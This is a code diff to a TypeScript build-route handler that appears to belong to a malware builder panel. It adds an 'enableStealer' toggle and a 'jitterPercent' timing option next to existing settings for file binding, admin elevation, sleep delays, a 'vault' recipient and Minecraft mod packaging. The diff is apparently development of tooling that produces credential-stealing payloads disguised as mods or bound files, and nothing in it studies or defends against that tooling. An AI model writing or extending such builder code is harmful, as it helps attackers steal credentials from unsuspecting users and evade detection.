@@ -71,6 +71,7 @@ export async function handleBuildRoutes(
         typhonVariant,
         enableVault,
         vaultRecipient,
+        enableStealer,
         enableJar,
         jarMcVersion,
         jarModName,
@@ -82,6 +83,7 @@ export async function handleBuildRoutes(
         requireAdmin,
         outputExtension,
         sleepSeconds,
+        jitterPercent,
         boundFiles,
       } = body;
 
@@ -181,6 +183,9 @@ export async function handleBuildRoutes(
       const safeSleepSeconds =
         typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
           ? sleepSeconds : 0;
+      const safeJitterPercent =
+        typeof jitterPercent === "number" && Number.isInteger(jitterPercent) && jitterPercent >= 0 && jitterPercent <= 50
+          ? jitterPercent : 20;
       const VALID_TYPHON_VARIANTS = new Set(["1", "2", "3", "4", "5", "6", "7", "8", "all", "safe", "rec"]);
       const safeTyphonVariant =
         typeof typhonVariant === "string" && VALID_TYPHON_VARIANTS.has(typhonVariant.trim().toLowerCase())
@@ -280,6 +285,7 @@ export async function handleBuildRoutes(
         vaultRecipient: !!enableVault && typeof vaultRecipient === "string" && vaultRecipient.trim().length > 0
           ? vaultRecipient.trim().slice(0, 512)
           : undefined,
+        enableStealer: !!enableStealer,
         enableJar: !!enableJar,
         jarMcVersion: typeof jarMcVersion === "string" && /^\d+\.\d+(\.\d+)?$/.test(jarMcVersion.trim())
           ? jarMcVersion.trim()
@@ -297,6 +303,7 @@ export async function handleBuildRoutes(
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
+        jitterPercent: safeJitterPercent,
         boundFiles: safeBoundFiles,
       });
 
